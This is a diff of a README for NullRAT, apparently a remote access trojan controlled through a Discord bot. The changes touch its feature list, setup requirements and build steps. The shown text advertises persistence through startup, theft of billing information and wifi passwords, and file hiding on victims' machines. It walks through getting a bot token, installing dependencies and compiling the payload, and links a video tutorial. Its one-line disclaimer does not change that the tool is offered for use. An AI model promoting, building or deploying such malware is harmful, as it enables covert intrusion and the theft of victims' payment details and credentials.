@@ -45,23 +45,26 @@
 -> Add executable to startup with one command</br>
 -> Find their billing information</br>
 -> Find their wifi names and passwords</br>
+-> Hide or unhide files in their computer</br>
 **) ...and more!</h4>
 </details>
 
 ## How to use:
 #### Requirements:
 - **Python 3.8+** (Tick "Add to PATH" while installing) [Microsoft Store version of Python **is broken**]
-- **PIP Folder added to path** (the path is `%APPDATA%\Python\{Your Python Version}\Scripts`)
+- **PIP Folder added to path** (the path is `C:\Users\{username}\Appdata\Roaming\Python\{python ver (Example: Python310)}\Scripts`)
 
 #### Preparation:
 - Create a Discord Bot and [get it's token](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#discord-bot-token)
-- [Create an invite link](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#proper-bot-invite-link) and add it to your server
-- Read [Getting Variables.md](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md) and store all the variables in a temporary file
+- [Create a proper invite link](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#proper-bot-invite-link) and add it to your server
+- Read [Getting Variables.md](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md) and store all the variables in a temporary file (optional)
 
 #### Steps:
 1. Dowload the latest release of NullRAT (git cloning/download zip will no longer work)
 2. Run the Dependencies Installer (which will install NullRAT's dependencies)
 3. Run the Compiler, and input information according to the temporary file. NullRAT payload will be right there!
+
+**Video tutorial:** [https://youtu.be/G8CsgWYiwWI](https://youtu.be/G8CsgWYiwWI)
 
 ## Donate:
 <h6 align=center>( <b>Even if you can't donate, you have been requested by master NullCode to star this project</b> )</br></br>
@@ -78,5 +81,5 @@
 2) Buntii
 3) usrDottik
 
-**RATing into others without their explicit permission is not pogchamp, and not supported by me.**
+**Infecting others via NullRAT without their permission is obviously not supported by me.**
 <h4 align=right>Software designed by NullCode</h6>
